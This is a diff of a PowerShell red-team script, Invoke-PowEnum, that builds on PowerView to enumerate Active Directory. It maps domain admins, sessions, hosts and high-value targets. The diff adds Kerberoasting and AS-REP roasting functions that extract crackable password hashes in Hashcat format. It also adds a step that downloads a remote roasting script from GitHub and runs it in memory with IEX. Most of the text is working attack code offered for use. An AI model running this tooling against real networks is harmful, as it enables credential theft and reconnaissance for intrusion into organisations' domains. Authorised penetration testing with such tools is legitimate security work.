@@ -9,10 +9,7 @@ function Invoke-PowEnum
 .NOTES 
 	Requires Excel to be installed on the systems running this script.
 	TODO:
-		Mode parameter (1-OnlyDCEnum 2-OnlyEnum 3-UserHunting 4-Kerberoast 5-LargeEnv)
-		Sheets (1-User/GroupEnumeration 2-Computer/SessionEnumeration 3-Kerberoast/AS-REPoast)
-			Add speciality user enum to user xls (http://www.netvision.com/ad_useraccountcontrol.php)
-			Create sperate xls for for invokes (Invoke-Kerb, Find-DomainLocalGroupMem, Find-DomainUserLocation -Stealth)
+		Add speciality user enum to user xls (http://www.netvision.com/ad_useraccountcontrol.php)
 	
 .LINK 
 	PowerSploit PowerView
@@ -31,7 +28,7 @@ Param(
 	$Domain,
 	
 	[Parameter(Position = 1)]
-	[ValidateSet('DCOnly', 'Hunting', 'Kerberoast', 'LargeEnv')]
+	[ValidateSet('DCOnly', 'Hunting', 'Roasting', 'LargeEnv')]
     [String]
     $Mode = 'DCOnly'
 )
@@ -55,46 +52,70 @@ IEX $webclient.DownloadString($url)
 if (!$domain) {$domain = (Get-Domain).Name}
 Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan
 
+#Supprese Errors and Warnings
 $ErrorActionPreference = 'Continue'
-$CSVSheetCount = 1
+$WarningPreference = "SilentlyContinue"
+
+$script:ExportSheetCount = 1
+$script:ExportSheetFileArray = @()
+
 
 if ($Mode -eq 'DCOnly') {
+	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
+	$script:ExportSheetCount = 1
+	$script:ExportSheetFileArray = @()
+	PowEnum-DAs
+	PowEnum-EAs
+	PowEnum-BltAdmins
+	PowEnum-Users
+	PowEnum-DCLocalAdmins
+	PowEnum-HVTs
+	PowEnum-Groups
+	PowEnum-ExcelFile -SpreadsheetName DCOnly-UsersAndGroups
+	
+	$script:ExportSheetCount = 1
+	$script:ExportSheetFileArray = @()
+	PowEnum-DCs
+	PowEnum-NetSess
+	PowEnum-Computers
+	PowEnum-IPs
+	PowEnum-Subnets
+	PowEnum-DNSRecords
+	PowEnum-ExcelFile -SpreadsheetName DCOnly-ComputersAndSessions
+}
+elseif ($Mode -eq 'Hunting') {
+	PowEnum-AdminEnum
+	PowEnum-UserHunting
+	PowEnum-ExcelFile -SpreadsheetName UserHunting
+}
+elseif ($Mode -eq 'Roasting') {
+	PowEnum-Kerberoast
+	PowEnum-ASREPRoast
+	PowEnum-ExcelFile -SpreadsheetName Roasting
+}
+elseif ($Mode -eq 'LargeEnv') {
 	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
 	PowEnum-DCs
 	PowEnum-DAs
 	PowEnum-EAs
 	PowEnum-BltAdmins
-	PowEnum-Users
-	PowEnum-Groups
-	PowEnum-Computers
 	PowEnum-IPs
 	PowEnum-DCLocalAdmins
 	PowEnum-Subnets
 	PowEnum-DNSRecords
 	PowEnum-HVTs
 	PowEnum-NetSess
-}
-elseif ($Mode -eq 'Hunting') {
-
-}
-elseif ($Mode -eq 'Kerberoast') {
-}
-elseif ($Mode -eq 'LargeEnv') {
+	PowEnum-ExcelFile -SpreadsheetName LargeEnvironment
 }
 else {
 	Write-Host "Incorrect Mode Selected"
 	Return
 }
 
-
-
-PowEnum-ExcelFile -SpreadsheetName AllLocalEnumeration
-
 $stopwatch.Stop()
 Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
 Write-Host "Exiting..." -ForegroundColor Yellow
 }
-
 
 function PowEnum-DCs {
 	Write-Host "[ ]Domain Controllers | " -NoNewLine
@@ -170,13 +191,48 @@ function PowEnum-HVTs {
 
 function PowEnum-NetSess {
 	try {
-	Write-Host "[ ]Net Sessions | " -NoNewLine
-	$temp = Get-DomainController -Domain $domain | Get-NetSession -ErrorAction SilentlyContinue
-	PowEnum-ExportAndCount -TypeEnum NetSess
-	}
-	catch {
-	Write-Host "Error"
-	}
+		Write-Host "[ ]Net Sessions | " -NoNewLine
+		$temp = Get-DomainController -Domain $domain | Get-NetSession
+		PowEnum-ExportAndCount -TypeEnum NetSess
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-UserHunting{
+	try{
+		Write-Host "[ ]User Hunting | " -NoNewLine
+		$temp = Find-DomainUserLocation -ShowAll -Domain $domain
+		PowEnum-ExportAndCount -TypeEnum UserHunt
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-AdminEnum{
+	try{
+		Write-Host "[ ]Admin Access Enumeration | " -NoNewLine
+		$temp = Find-DomainLocalGroupMember
+		PowEnum-ExportAndCount -TypeEnum UserHunt
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-Kerberoast {
+	try{
+		Write-Host "[ ]Kerberoast | " -NoNewLine
+		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $domain -WarningAction silentlyContinue
+		PowEnum-ExportAndCount -TypeEnum Kerberoast
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-ASREPRoast {
+	try{
+		$webclient = New-Object System.Net.WebClient
+		$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+		$url = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
+		Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
+		Write-Host "$url"
+		IEX $webclient.DownloadString($url)
+		Write-Host "[ ]ASREProast | " -NoNewLine
+		$temp = Invoke-ASREPRoast -Domain $domain
+		PowEnum-ExportAndCount -TypeEnum ASREPRoast
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-ExportAndCount {
@@ -185,10 +241,24 @@ function PowEnum-ExportAndCount {
 		[String]
 		$TypeEnum
 	)
-	if($temp -ne $null){$temp | Export-CSV -NoTypeInformation -Path ('.\' + $CSVSheetCount +'_' + $TypeEnum + '.csv')}
+	if($temp -ne $null){
+		
+		#Grab the file name and the full path
+		$exportfilename = $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
+		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
+		
+		#Perform the actual export
+		$temp | Export-CSV -NoTypeInformation -Path ('.\' + $exportfilename)
+
+		#Create new file object and add to array
+		$ExportSheetFile = new-object psobject
+		$ExportSheetFile | add-member NoteProperty Name $exportfilename
+		$ExportSheetFile | add-member NoteProperty FullName $exportfilepath
+		$script:ExportSheetFileArray += $ExportSheetFile
+	}
 	$count = $temp | measure-object | select-object -expandproperty Count
 	Write-Host "$count Identified" -ForegroundColor Green
-	$CSVSheetCount++
+	$script:ExportSheetCount++
 }
 
 function PowEnum-ExcelFile
@@ -199,61 +269,64 @@ function PowEnum-ExcelFile
 		$SpreadsheetName
 	)
 	
-	Write-Host "[ ]Combining CSV Files to XSLX | " -NoNewLine
-	$path = (Get-Item -Path ".\" -Verbose).FullName
-	$XLOutput =  $path + "\" + $env:USERNAME + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"
-
-	$csvFiles = Get-ChildItem (".\*") -Include *.csv | Sort-Object | Where {$_.Length -ne 0}
-
-	# Create Excel object (visible), workbook and worksheet
-	$Excel = New-Object -ComObject excel.application 
-	$Excel.visible = $false
-	$Excel.sheetsInNewWorkbook = $csvFiles.Count
-	$workbooks = $excel.Workbooks.Add()
-	$CSVSheet = 1
-
-	Foreach ($CSV in $Csvfiles) {
-
-		$worksheets = $workbooks.worksheets
-		$CSVFullPath = $CSV.FullName
+	try {
+		Write-Host "[ ]Combining CSV Files to XSLX | " -NoNewLine
 		
-		$SheetName = ($CSV.name -split "\.")[0]
-		$worksheet = $worksheets.Item($CSVSheet)
-		$worksheet.Name = $SheetName
-		
-		# Define the connection string and the starting cell for the data
-		$TxtConnector = ("TEXT;" + $CSVFullPath)
-		$CellRef = $worksheet.Range("A1")
+		#Exit if enumeration resulting in nothing
+		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "Exiting: No Data Identified" -ForegroundColor Red; Return}
+		$path = (Get-Item -Path ".\" -Verbose).FullName
+		$XLOutput =  $path + "\" + $env:USERNAME + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"
 
-		# Build, use and remove the text file connector
-		$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
-		$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
-		$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
-		$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
-		$worksheet.QueryTables.item($Connector.name).delete()
+		# Create Excel object (visible), workbook and worksheet
+		$Excel = New-Object -ComObject excel.application 
+		$Excel.visible = $false
+		$Excel.sheetsInNewWorkbook = $script:ExportSheetFileArray.Count
+		$workbooks = $excel.Workbooks.Add()
+		$CSVSheet = 1
 
-		# Autofit the columns, freeze the top row
-		$worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
-		$worksheet.Application.ActiveWindow.SplitRow = 1
-		$worksheet.Application.ActiveWindow.FreezePanes = $true
+		Foreach ($CSV in $script:ExportSheetFileArray) {
 
-		# Set color & border to top header row
-		$Selection = $worksheet.cells.Item(1,1).EntireRow
-		$Selection.Interior.ColorIndex = 37
-		$Selection.BorderAround(1) | Out-Null
-		$Selection.Font.Bold=$True
-		
-		$CSVSheet++
-	}
+			$worksheets = $workbooks.worksheets
+			$CSVFullPath = $CSV.FullName
+			
+			$SheetName = ($CSV.name -split "\.")[0]
+			$worksheet = $worksheets.Item($CSVSheet)
+			$worksheet.Name = $SheetName
+			
+			# Define the connection string and the starting cell for the data
+			$TxtConnector = ("TEXT;" + $CSVFullPath)
+			$CellRef = $worksheet.Range("A1")
 
-	# Save workbook and close Excel
-	$workbooks.SaveAs($XLOutput,51)
-	$workbooks.Saved = $true
-	$workbooks.Close()
-	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
-	$Excel.Quit()
-	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
-	Write-Host " $CSVSheet Sheeet(s) Processed" -ForegroundColor Green
-	[System.GC]::Collect()
-	[System.GC]::WaitForPendingFinalizers()
+			# Build, use and remove the text file connector
+			$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
+			$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
+			$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
+			$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
+			$worksheet.QueryTables.item($Connector.name).delete()
+
+			# Autofit the columns, freeze the top row
+			$worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
+			$worksheet.Application.ActiveWindow.SplitRow = 1
+			$worksheet.Application.ActiveWindow.FreezePanes = $true
+
+			# Set color & border to top header row
+			$Selection = $worksheet.cells.Item(1,1).EntireRow
+			$Selection.Interior.ColorIndex = 37
+			$Selection.BorderAround(1) | Out-Null
+			$Selection.Font.Bold=$True
+			
+			$CSVSheet++
+		}
+
+		# Save workbook and close Excel
+		$workbooks.SaveAs($XLOutput,51)
+		$workbooks.Saved = $true
+		$workbooks.Close()
+		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
+		$Excel.Quit()
+		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
+		Write-Host " $CSVSheet Sheeet(s) Processed" -ForegroundColor Green
+		[System.GC]::Collect()
+		[System.GC]::WaitForPendingFinalizers()
+	}catch{Write-Host "Error" -ForegroundColor Red}
 }
